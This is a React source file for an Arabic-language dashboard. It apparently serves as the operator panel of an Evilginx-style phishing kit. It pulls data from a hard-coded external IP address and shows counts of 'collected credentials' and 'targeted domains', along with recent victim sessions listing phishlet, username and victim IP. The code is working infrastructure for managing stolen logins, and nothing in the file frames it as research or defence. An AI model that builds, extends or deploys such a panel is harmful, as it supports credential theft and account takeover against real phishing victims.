import React, { useState, useEffect } from 'react';
import { Link } from 'react-router-dom';
import axios from 'axios';
import { 
  Grid, 
  Paper, 
  Typography, 
  Box, 
  CircularProgress, 
  Alert,
  Card,
  CardContent,
  Button
} from '@mui/material';
import SessionsIcon from '@mui/icons-material/Lan';
import CredentialsIcon from '@mui/icons-material/VpnKey';
import DomainsIcon from '@mui/icons-material/Language';
import { Chart as ChartJS, ArcElement, CategoryScale, LinearScale, PointElement, LineElement, Title, Tooltip, Legend, BarElement } from 'chart.js';
import { Pie, Line } from 'react-chartjs-2';

// Register ChartJS components
ChartJS.register(ArcElement, CategoryScale, LinearScale, PointElement, LineElement, BarElement, Title, Tooltip, Legend);

const Dashboard = () => {
  const [stats, setStats] = useState(null);
  const [recentSessions, setRecentSessions] = useState([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    const fetchData = async () => {
      try {
        // Fetch statistics
        const statsRes = await axios.get('http://5.199.168.182:5000/api/sessions/stats');
        setStats(statsRes.data.data);

        // Fetch recent sessions
        const sessionsRes = await axios.get('http://5.199.168.182:5000/api/sessions');
        setRecentSessions(sessionsRes.data.data.slice(0, 5)); // Get latest 5 sessions

        setLoading(false);
      } catch (err) {
        setError(err.response?.data?.message || 'Error fetching dashboard data');
        setLoading(false);
      }
    };

    fetchData();
  }, []);

  const getLineChartData = () => {
    if (!stats) return null;

    const dates = Object.keys(stats.byDay);
    const counts = Object.values(stats.byDay);

    return {
      labels: dates,
      datasets: [
        {
          label: 'عدد الجلسات',
          data: counts,
          borderColor: '#f50057',
          backgroundColor: 'rgba(245, 0, 87, 0.1)',
          tension: 0.4,
          fill: true,
        },
      ],
    };
  };

  const getPieChartData = () => {
    if (!stats) return null;

    return {
      labels: Object.keys(stats.byDomain),
      datasets: [
        {
          data: Object.values(stats.byDomain),
          backgroundColor: [
            '#f44336',
            '#3f51b5',
            '#4caf50',
            '#ff9800',
            '#9c27b0',
            '#00bcd4',
          ],
          borderWidth: 1,
        },
      ],
    };
  };

  if (loading) {
    return (
      <Box sx={{ display: 'flex', justifyContent: 'center', py: 5 }}>
        <CircularProgress />
      </Box>
    );
  }

  if (error) {
    return (
      <Alert severity="error" sx={{ mt: 3 }}>
        {error}
      </Alert>
    );
  }

  return (
    <div>
      <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 3 }}>
        <Typography variant="h4" component="h1" gutterBottom>
          لوحة التحكم
        </Typography>
        <Button component={Link} to="/sessions" variant="contained" color="primary">
          عرض كل الجلسات
        </Button>
      </Box>

      {/* Stats Summary */}
      <Grid container spacing={3} sx={{ mb: 4 }}>
        <Grid item xs={12} sm={4}>
          <Paper
            sx={{
              p: 3,
              display: 'flex',
              flexDirection: 'column',
              height: 140,
              backgroundColor: '#f3f8ff',
              borderTop: '4px solid #3f51b5',
            }}
          >
            <Typography component="h2" variant="h6" color="primary" gutterBottom>
              إجمالي الجلسات
            </Typography>
            <Typography component="div" variant="h3" sx={{ mt: 'auto' }}>
              <Box sx={{ display: 'flex', alignItems: 'center' }}>
                <SessionsIcon sx={{ fontSize: 30, mr: 1, color: '#3f51b5' }} />
                {stats?.totalSessions || 0}
              </Box>
            </Typography>
          </Paper>
        </Grid>
        <Grid item xs={12} sm={4}>
          <Paper
            sx={{
              p: 3,
              display: 'flex',
              flexDirection: 'column',
              height: 140,
              backgroundColor: '#f3fff5',
              borderTop: '4px solid #4caf50',
            }}
          >
            <Typography component="h2" variant="h6" color="primary" gutterBottom>
              عدد بيانات الاعتماد المجمعة
            </Typography>
            <Typography component="div" variant="h3" sx={{ mt: 'auto' }}>
              <Box sx={{ display: 'flex', alignItems: 'center' }}>
                <CredentialsIcon sx={{ fontSize: 30, mr: 1, color: '#4caf50' }} />
                {stats?.withCredentials || 0}
              </Box>
            </Typography>
          </Paper>
        </Grid>
        <Grid item xs={12} sm={4}>
          <Paper
            sx={{
              p: 3,
              display: 'flex',
              flexDirection: 'column',
              height: 140,
              backgroundColor: '#fff8f3',
              borderTop: '4px solid #ff9800',
            }}
          >
            <Typography component="h2" variant="h6" color="primary" gutterBottom>
              عدد النطاقات المستهدفة
            </Typography>
            <Typography component="div" variant="h3" sx={{ mt: 'auto' }}>
              <Box sx={{ display: 'flex', alignItems: 'center' }}>
                <DomainsIcon sx={{ fontSize: 30, mr: 1, color: '#ff9800' }} />
                {stats ? Object.keys(stats.byDomain).length : 0}
              </Box>
            </Typography>
          </Paper>
        </Grid>
      </Grid>

      {/* Charts */}
      <Grid container spacing={3} sx={{ mb: 4 }}>
        <Grid item xs={12} md={8}>
          <Paper sx={{ p: 3 }}>
            <Typography variant="h6" gutterBottom>
              الجلسات النشطة (آخر 7 أيام)
            </Typography>
            {getLineChartData() && (
              <Box sx={{ height: 300 }}>
                <Line
                  data={getLineChartData()}
                  options={{
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {
                      legend: {
                        position: 'top',
                      },
                    },
                    scales: {
                      y: {
                        beginAtZero: true,
                        ticks: {
                          precision: 0
                        }
                      }
                    }
                  }}
                />
              </Box>
            )}
          </Paper>
        </Grid>
        <Grid item xs={12} md={4}>
          <Paper sx={{ p: 3 }}>
            <Typography variant="h6" gutterBottom>
              توزيع النطاقات
            </Typography>
            {getPieChartData() && (
              <Box sx={{ height: 300, display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
                <Pie
                  data={getPieChartData()}
                  options={{
                    responsive: true,
                    maintainAspectRatio: false,
                    plugins: {
                      legend: {
                        position: 'bottom',
                      },
                    },
                  }}
                />
              </Box>
            )}
          </Paper>
        </Grid>
      </Grid>

      {/* Recent Sessions */}
      <Typography variant="h5" sx={{ mb: 2 }}>
        آخر الجلسات
      </Typography>
      {recentSessions.length > 0 ? (
        <Grid container spacing={2}>
          {recentSessions.map((session) => (
            <Grid item xs={12} sm={6} md={4} key={session.id}>
              <Card className="session-card" component={Link} to={`/sessions/${session.id}`} sx={{ textDecoration: 'none' }}>
                <CardContent>
                  <Typography color="primary" gutterBottom>
                    نطاق: {session.phishlet}
                  </Typography>
                  <Typography variant="body2" color="text.secondary">
                    المستخدم: {session.username || 'غير مسجل'}
                  </Typography>
                  <Typography variant="body2" color="text.secondary">
                    الوقت: {new Date(session.create_time * 1000).toLocaleString()}
                  </Typography>
                  <Typography variant="body2" color="text.secondary">
                    IP: {session.remote_addr}
                  </Typography>
                </CardContent>
              </Card>
            </Grid>
          ))}
        </Grid>
      ) : (
        <Alert severity="info">لا توجد جلسات حالية</Alert>
      )}
    </div>
  );
};

export default Dashboard; 